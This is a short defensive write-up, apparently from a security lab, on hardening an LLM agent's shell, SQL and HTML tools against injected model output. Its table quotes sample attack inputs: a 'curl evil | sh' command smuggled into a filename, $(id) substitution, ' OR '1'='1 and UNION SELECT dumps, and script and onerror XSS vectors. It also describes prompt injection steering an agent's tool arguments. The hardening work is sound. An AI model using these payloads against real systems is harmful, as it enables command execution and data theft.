# S5 fix: safe sinks

Model output is attacker-influenced (via prompt injection or the user) and must be treated like any other untrusted input at the point it is *used*, not just where it is produced.

| Sink | Flaw | Fix |
|---|---|---|
| Shell (`file_stats`) | filename spliced into `wc -c <filename>`; `a; curl evil \| sh`, `$(id)`, backticks, `&&`, redirection spawn extra commands | no shell: validated filename (no leading `-`, no metacharacters), confined path, argv list `["wc","-c",path]` |
| SQL (`lookup_customer`) | f-string query; `' OR '1'='1` and `UNION SELECT name, note` dump other customers' notes | shape check **and** bound parameter; connection set `PRAGMA query_only=ON` |
| HTML (`write_report`) | title/body interpolated raw; `<script>`, `onerror=`, `javascript:` become stored XSS | `html.escape` both fields; CSP `default-src 'none'`; report body is text (`<pre>`) |
| All tools | arguments trusted as-is | `validate_args`: reject extra/missing keys, non-strings, over-long values, NUL bytes |

Nothing is really executed in the lab. `agent/shellsim.py` parses a command line the way a POSIX shell would and lists the commands it would have started, which is what the tests assert on.

Limits:
- Escaping makes the report plain text. Supporting rich formatting safely means a vetted Markdown renderer plus an HTML sanitiser (allow-list of tags/attributes), not regexes.
- The name regex rejects some legitimate names (non-Latin scripts). The bound parameter is the actual SQL control; the regex is defence in depth.
- Real command execution should still run inside a throwaway container with no network.
